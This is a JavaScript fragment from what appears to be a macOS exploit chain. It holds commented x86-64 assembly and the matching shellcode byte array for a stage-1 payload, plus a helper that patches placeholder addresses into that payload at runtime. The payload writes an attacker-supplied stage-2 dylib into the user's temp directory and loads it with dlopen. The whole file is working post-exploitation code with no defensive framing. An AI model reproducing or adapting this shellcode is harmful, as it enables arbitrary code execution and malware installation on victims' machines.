/*
BITS 64

start:
; int 3

; Step 0: function prologue
  sub rsp, 0x1008             ; ensure 16-byte alignment

; Step 1: call confstr() and build the path to our stage 2 .dylib on the stack
  mov rdx, 0x1000
  mov rsi, rsp
  mov rdi, 65537                          ; _CS_DARWIN_USER_TEMP_DIR
  mov rax, 0x4141414141414141             ; will be replaced with &confstr
  call rax                                ; confstr()
  test rax, rax
  jnz build_path
  mov rax, 0xffff000000000001             ; return 1 to indicate failure in confstr
  jmp exit

build_path:
  dec rax
  mov rcx, rsp
  add rcx, rax
  mov dword [rcx], 0x79642e78             ; x.dy
  mov dword [rcx+4], 0x62696c             ; lib\x00

; Step 2: write dylib to filesystem
  mov rax, 0x2000005                      ; sys_open
  mov rdi, rsp                            ; path
  mov rdx, 0x1ed                          ; protections (0644)
  mov rsi, 0x602                          ; O_TRUNC | O_CREAT | O_RDWR
  syscall
  jnb write_file
  mov rax, 0xffff000000000002             ; return 2 to indicate failure in open
  jmp exit

write_file:
  mov rdi, rax
  mov rsi, 0x4242424242424242
  mov r8, 0x4343434343434343             ; rdx is set to zero during the syscall...
write_loop:
  mov rdx, r8
  mov rax, 0x2000004                      ; sys_write
  syscall
  jnb write_succeeded
  mov rax, 0xffff000000000003             ; return 3 to indicate failure in write
  jmp exit
write_succeeded:
  sub r8, rax
  add rsi, rax
  test r8, r8
  jnz write_loop

; Step 3: open dylib with dlopen
dlopen:
  xor rsi, rsi
  mov rdi, rsp
  mov rax, 0x4444444444444444             ; will be replaced with &dlopen
  call rax
  test rax, rax
  jnz exit_success
  mov rax, 0xffff000000000004 			; return 4 to indicate failure in dlopen
  jmp exit

; Step 4: function epilogue and return
exit_success:
  mov rax, 0xffff000000000000             ; return 0 for success
exit:
  add rsp, 0x1008
  ret
*/

var stage1 = [72,129,236,8,16,0,0,186,0,16,0,0,72,137,230,191,1,0,1,0,72,184,65,65,65,65,65,65,65,65,255,208,72,133,192,117,15,72,184,1,0,0,0,0,0,255,255,233,159,0,0,0,72,255,200,72,137,225,72,1,193,199,1,120,46,100,121,199,65,4,108,105,98,0,184,5,0,0,2,72,137,231,186,237,1,0,0,190,2,6,0,0,15,5,115,12,72,184,2,0,0,0,0,0,255,255,235,103,72,137,199,72,190,66,66,66,66,66,66,66,66,73,184,67,67,67,67,67,67,67,67,76,137,194,184,4,0,0,2,15,5,115,12,72,184,3,0,0,0,0,0,255,255,235,56,73,41,192,72,1,198,77,133,192,117,221,72,49,246,72,137,231,72,184,68,68,68,68,68,68,68,68,255,208,72,133,192,117,12,72,184,4,0,0,0,0,0,255,255,235,10,72,184,0,0,0,0,0,0,255,255,72,129,196,8,16,0,0,195];

stage1.replace = function(oldVal, newVal) {
    for (var idx = 0; idx < this.length; idx++) {
        var found = true;
        for (var j = idx; j < idx + 8; j++) {
            if (this[j] != oldVal.byteAt(j - idx)) {
                found = false;
                break;
            }
        }
        if (found)
            break;
    }
    for (b of newVal.bytes())
        this[idx++] = b;
};
